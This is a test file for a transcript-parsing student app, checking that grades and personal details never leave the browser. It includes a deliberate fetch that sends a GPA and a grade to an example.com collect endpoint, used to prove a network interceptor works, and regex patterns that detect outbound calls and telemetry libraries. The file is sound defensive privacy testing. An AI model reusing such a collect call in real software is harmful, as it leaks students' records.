// @vitest-environment happy-dom
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { App } from './App.tsx';
import { clearEverything, saveTranscript, savePlan, storedKeys } from './storage.ts';
import { planetTerpCourseUrl } from '../lib/planetterp.ts';
import { buildIssueReport, issueContextFrom } from '../lib/issueReport.ts';
import type { CourseEntry, Transcript } from '../lib/types.ts';

/**
 * The claim this app makes is that a transcript never leaves the device. These
 * are the tests that hold it to that.
 *
 * Two layers, because they fail differently. The runtime layer catches an
 * outbound call actually happening; the source layer catches one being *added*,
 * including on a code path no test happens to exercise. A `fetch` inside a rare
 * error branch would sail past the first and be caught by the second.
 */

afterEach(cleanup);
beforeEach(() => {
  window.localStorage.clear();
  vi.restoreAllMocks();
});

/** Strings that must never appear in a request URL, a request body, or storage. */
const SECRETS = [
  'Byanjankar',
  '119781326',
  'ORGANIC CHEMISTRY',
  'D-',
  '2.104',
  'secretstudent@terpmail.umd.edu',
];

function course(courseId: string, title: string, grade: CourseEntry['grade']): CourseEntry {
  return {
    courseId,
    title,
    credits: 3,
    creditsEarned: 3,
    grade,
    gradePoints: 0.7,
    countsTowardGpa: true,
    source: 'institution',
  };
}

/** Loaded with every kind of thing that must not escape. */
const loaded: Transcript = {
  major: 'Computer Science',
  terms: [
    {
      id: '2025-Fall',
      season: 'Fall',
      year: 2025,
      courses: [course('CMSC131', 'ORGANIC CHEMISTRY', 'D-')],
      statedTermGpa: 2.104,
      statedTermCredits: 3,
    },
  ],
  nonGpaCredits: [],
  inProgress: [],
  statedCumulativeGpa: 2.104,
  statedCumulativeCredits: 3,
  warnings: [
    {
      code: 'unparsed_line',
      message: 'Byanjankar 119781326 secretstudent@terpmail.umd.edu',
      detail: 'CMSC420  ORGANIC CHEMISTRY  D-  3.00  3.00  3.00',
    },
  ],
};

interface Attempt {
  api: string;
  url: string;
  body: string;
}

/** Replace every outbound primitive with a recorder. */
function interceptNetwork(): Attempt[] {
  const attempts: Attempt[] = [];
  const record = (api: string, url: unknown, body: unknown) =>
    attempts.push({ api, url: String(url ?? ''), body: body == null ? '' : String(body) });

  vi.stubGlobal('fetch', (url: unknown, init?: { body?: unknown }) => {
    record('fetch', url, init?.body);
    return Promise.reject(new Error('network disabled in tests'));
  });
  vi.stubGlobal(
    'XMLHttpRequest',
    class {
      #url: unknown = '';
      open(_method: string, url: unknown) {
        this.#url = url;
      }
      send(body?: unknown) {
        record('xhr', this.#url, body);
      }
      setRequestHeader() {}
      addEventListener() {}
    },
  );
  vi.stubGlobal(
    'WebSocket',
    class {
      constructor(url: unknown) {
        record('websocket', url, '');
      }
      close() {}
      addEventListener() {}
    },
  );
  vi.stubGlobal('EventSource', class { constructor(url: unknown) { record('eventsource', url, ''); } close() {} });
  if (typeof navigator !== 'undefined') {
    vi.spyOn(navigator, 'sendBeacon').mockImplementation(
      (url: string | URL, data?: BodyInit | null) => {
        record('sendBeacon', url, data);
        return true;
      },
    );
  }
  return attempts;
}

describe('nothing goes out over the network', () => {
  it('makes no outbound request while a real transcript is loaded and every view is visited', async () => {
    const attempts = interceptNetwork();
    saveTranscript(loaded);

    render(<App />);
    // Every tab, because a lookup would most plausibly live in one of them.
    for (const label of ['Dashboard', 'Requirements', 'Schedule', 'Planner', 'Transcript']) {
      const tab = screen.queryByRole('button', { name: label });
      if (tab) fireEvent.click(tab);
      await new Promise((resolve) => setTimeout(resolve, 0));
    }

    expect(attempts).toEqual([]);
  });

  it('would catch a request carrying a grade or a GPA if one were ever made', () => {
    // Proves the interceptor above is actually wired to something, rather than
    // passing because nothing could ever have been recorded.
    const attempts = interceptNetwork();
    void fetch('https://example.com/collect?gpa=2.104', { body: 'grade=D-' }).catch(() => {});

    expect(attempts).toHaveLength(1);
    const offending = attempts.filter((attempt) =>
      SECRETS.some((secret) => attempt.url.includes(secret) || attempt.body.includes(secret)),
    );
    expect(offending).toHaveLength(1);
  });
});

describe('URLs the app builds for the user to follow', () => {
  it('puts only a course code in a PlanetTerp link', () => {
    const url = planetTerpCourseUrl('CMSC131');
    expect(url).toBe('https://planetterp.com/course/CMSC131');
    for (const secret of SECRETS.filter((s) => s !== 'CMSC131')) {
      expect(url).not.toContain(secret);
    }
  });

  it('puts no transcript content in the bug-report URL', () => {
    const { url } = buildIssueReport(issueContextFrom({ view: 'Dashboard', transcript: loaded }));
    const decoded = decodeURIComponent(url);
    for (const secret of SECRETS) {
      expect(decoded, `issue URL leaked ${secret}`).not.toContain(secret);
    }
  });
});

describe('the source contains no way to send anything', () => {
  // Reading the source rather than the behaviour, so a `fetch` added on a path
  // no test exercises still fails.
  const OUTBOUND = /\b(fetch\s*\(|XMLHttpRequest|sendBeacon|new\s+WebSocket|new\s+EventSource|navigator\.connection)/;

  function sourceFiles(dir: string): string[] {
    return readdirSync(dir).flatMap((entry) => {
      const full = join(dir, entry);
      if (statSync(full).isDirectory()) return sourceFiles(full);
      if (!/\.(ts|tsx)$/.test(entry) || entry.includes('.test.')) return [];
      return [full];
    });
  }

  it('has no outbound network primitive in app/ or lib/', () => {
    const offenders = [...sourceFiles('app'), ...sourceFiles('lib')]
      .filter((file) => OUTBOUND.test(readFileSync(file, 'utf8')))
      // The worker client legitimately names `new Worker`, not a network call;
      // nothing else is expected here. Any new entry is a finding, not a fixture.
      .map((file) => file.replace(/\\/g, '/'));

    expect(offenders).toEqual([]);
  });

  it('has no analytics or error-reporting dependency', () => {
    const pkg = JSON.parse(readFileSync('package.json', 'utf8'));
    const runtime = Object.keys(pkg.dependencies ?? {});
    expect(runtime.sort()).toEqual(['pdfjs-dist', 'react', 'react-dom']);

    const suspicious = /sentry|bugsnag|rollbar|datadog|segment|amplitude|mixpanel|posthog|ga4|gtag|analytics/i;
    for (const name of [...runtime, ...Object.keys(pkg.devDependencies ?? {})]) {
      expect(suspicious.test(name), `${name} looks like telemetry`).toBe(false);
    }
  });

  it('logs nothing from a transcript', () => {
    // A stack trace or a logged object is the quiet way parsed content escapes
    // into a devtools session somebody later pastes somewhere.
    const logging = [...sourceFiles('app'), ...sourceFiles('lib')].flatMap((file) =>
      readFileSync(file, 'utf8')
        .split('\n')
        .map((line, index) => ({ file, index: index + 1, line }))
        .filter(({ line }) => /console\.(log|error|warn|info|debug)/.test(line)),
    );

    // One dev-only line about data/quotes.json, which never sees a transcript.
    expect(logging).toHaveLength(1);
    expect(logging[0]!.file).toContain('quotes');
  });
});

describe('storage', () => {
  it('keeps everything under one prefix, and clearing removes all of it', () => {
    saveTranscript(loaded);
    savePlan({ courses: [{ courseId: 'CMSC351', credits: 3 }], targetGpa: 3.5 });
    window.localStorage.setItem('terptracker.legacy.v0', 'left over from an older build');
    // Something belonging to another app on the same origin must survive.
    window.localStorage.setItem('unrelated.key', 'not ours');

    expect(storedKeys()).toEqual([
      'terptracker.legacy.v0',
      'terptracker.plan.v1',
      'terptracker.transcript.v1',
    ]);

    const removed = clearEverything();
    expect(removed).toHaveLength(3);
    expect(storedKeys()).toEqual([]);
    expect(window.localStorage.getItem('unrelated.key')).toBe('not ours');
  });

  it('leaves no trace of a transcript behind after clearing', () => {
    saveTranscript(loaded);
    clearEverything();

    const everything = Object.keys(window.localStorage)
      .map((key) => `${key}=${window.localStorage.getItem(key)}`)
      .join('\n');
    for (const secret of SECRETS) {
      expect(everything, `storage still holds ${secret}`).not.toContain(secret);
    }
  });
});
